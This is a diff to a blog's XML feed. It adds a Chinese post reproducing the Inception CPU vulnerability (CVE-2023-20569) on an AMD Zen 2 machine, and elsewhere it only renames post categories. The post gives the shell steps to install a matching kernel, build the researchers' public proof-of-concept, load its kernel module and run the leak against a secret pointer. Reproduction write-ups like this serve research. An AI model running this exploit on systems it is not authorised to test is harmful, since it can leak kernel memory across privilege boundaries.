@@ -4,6 +4,35 @@
   
   
   <entry>
+    <title>(CVE-2023-20569)Inception漏洞复现</title>
+    <link href="/2025/07/17/CVE-2023-20569-Inception%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <url>/2025/07/17/CVE-2023-20569-Inception%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>内容来源：</p><ol><li><a href="https://www.usenix.org/conference/usenixsecurity23/presentation/trujillo">https://www.usenix.org/conference/usenixsecurity23/presentation/trujillo</a></li><li><a href="https://comsec.ethz.ch/research/microarch/inception/">https://comsec.ethz.ch/research/microarch/inception/</a></li><li><a href="https://github.com/comsec-group/inception">https://github.com/comsec-group/inception</a></li></ol></blockquote><h1 id="1-复现环境"><a href="#1-复现环境" class="headerlink" title="1 复现环境"></a>1 复现环境</h1><ul><li>CPU：AMD EPYC 7252 8-Core Processor（使用的是 zen2 的 CPU，因此复现的是 zen1 或 zen2 的部分）</li><li>Microcode：0x8301072</li><li>Linux Kernel：5.19.0-28-generic</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1752762548493-2a740cda-946d-4f87-b2d8-be6134d192ef.png" alt="img"></p><h1 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2 环境配置"></a>2 环境配置</h1><p>linux 内核版本具有限制，如果为非<code>5.19.0-28-generic</code>的 linux 内核无法成功复现实验。</p><p>原因是由于代码中部分 gadget 采用的是硬编码的形式，在其他版本的 linux 内核中 gadget 偏移不一致或不存在相关的 gadget。</p><p>作者提供的 linux 内核下载链接：<a href="https://jknr.me/filez/ubuntu-5.19.0-28-generic.tar.gz">https://jknr.me/filez/ubuntu-5.19.0-28-generic.tar.gz</a></p><p>以下是切换内核的相应方法；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -zxvf ubuntu-5.19.0-28-generic.tar.gz<br><span class="hljs-built_in">cd</span> ubuntu-5.19.0-28-generic<br>sudo <span class="hljs-built_in">cp</span> vmlinuz-5.19.0-28-generic /boot/<br>sudo <span class="hljs-built_in">cp</span> initrd.img-5.19.0-28-generic /boot/<br>sudo <span class="hljs-built_in">cp</span> System.map-5.19.0-28-generic /boot/<br>sudo <span class="hljs-built_in">cp</span> config-5.19.0-28-generic /boot/<br>sudo vim /etc/default/grub<br><span class="hljs-comment"># GRUB_DEFAULT=&quot;1&gt;4&quot;(不一定一样,先采用下面的方法，不行在查该方式的配置方法)</span><br><span class="hljs-comment"># GRUB_DEFAULT=&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 5.19.0-28-generic&quot;</span><br>sudo update-grub<br>sudo reboot<br><span class="hljs-built_in">uname</span> -r<br>sudo <span class="hljs-built_in">ln</span> -sf &lt;ubuntu-5.19.0-28-generic full path&gt;/usr/src/linux-headers-5.19.0-28-generic /lib/modules/5.19.0-28-generic/build<br></code></pre></td></tr></table></figure><h1 id="3-复现步骤"><a href="#3-复现步骤" class="headerlink" title="3 复现步骤"></a>3 复现步骤</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/comsec-group/inception.git<br>sudo apt install clang gcc-12<br><span class="hljs-built_in">export</span> CC=gcc-12<br><span class="hljs-built_in">cd</span> inception/inception/zen_1_2<br>clang -DZEN2 -DCORE1=1 -DCORE2=9 inception.c -o inception<br>clang -DSET=33 workload.c -o workload<br><span class="hljs-built_in">cd</span> ../kmod<br>make install<br>sudo dmesg | <span class="hljs-built_in">tail</span> -n 10<span class="hljs-comment"># 获取secret_ptr</span><br><span class="hljs-built_in">cd</span> ../zen_1_2<br>./inception 0x&lt;secret_ptr&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1752763688641-1a9e0d4b-f603-4d0e-9eab-e97e0ac8eba2.png" alt="img"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>科研工作</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+      <tag>CPU</tag>
+      
+      <tag>处理器漏洞</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>免入土（五）绕过 IAT Hook / Inline Hook 实现SafeGetProcAddress</title>
     <link href="/2025/07/13/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E4%BA%94%EF%BC%89%E7%BB%95%E8%BF%87-IAT-Hook-Inline-Hook-%E5%AE%9E%E7%8E%B0SafeGetProcAddress/"/>
     <url>/2025/07/13/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E4%BA%94%EF%BC%89%E7%BB%95%E8%BF%87-IAT-Hook-Inline-Hook-%E5%AE%9E%E7%8E%B0SafeGetProcAddress/</url>
@@ -216,7 +245,7 @@
     
     <categories>
       
-      <category>科研论文</category>
+      <category>科研工作</category>
       
     </categories>
     
@@ -278,7 +307,7 @@
     
     <categories>
       
-      <category>科研论文</category>
+      <category>科研工作</category>
       
     </categories>
     
@@ -601,7 +630,7 @@
     
     <categories>
       
-      <category>科研论文</category>
+      <category>科研工作</category>
       
     </categories>
     
@@ -690,7 +719,7 @@
     
     <categories>
       
-      <category>科研论文</category>
+      <category>科研工作</category>
       
     </categories>
     
@@ -752,7 +781,7 @@
     
     <categories>
       
-      <category>科研论文</category>
+      <category>科研工作</category>
       
     </categories>
     
